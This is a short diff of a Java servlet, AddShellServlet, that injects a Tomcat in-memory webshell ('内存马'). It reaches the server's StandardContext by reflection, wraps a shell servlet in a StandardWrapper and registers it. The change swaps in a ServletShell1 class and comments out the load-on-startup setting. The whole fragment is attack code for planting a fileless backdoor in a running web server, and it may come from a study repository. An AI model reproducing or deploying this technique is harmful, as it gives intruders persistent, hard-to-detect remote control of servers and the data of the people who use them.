@@ -35,13 +35,16 @@ public class AddShellServlet extends HttpServlet {
             StandardContext standardContext = (StandardContext) atx.get(applicationContext);
 
             //准备内存马
-            ServletShell shell = new ServletShell();
+            //ServletShell shell = new ServletShell();
+            ServletShell1 shell = new ServletShell1();
 
             //用wrapper包装内存马
             Wrapper wrapper = new StandardWrapper();
             wrapper.setServlet(shell);
             wrapper.setName("shell");
-            wrapper.setLoadOnStartup(1);
+            //设置加载顺序
+            //wrapper.setLoadOnStartup(1);
+            //设置servlet全限定名，可以不设置
             wrapper.setServletClass(shell.getClass().getName());
 
             //添加到标准上下文
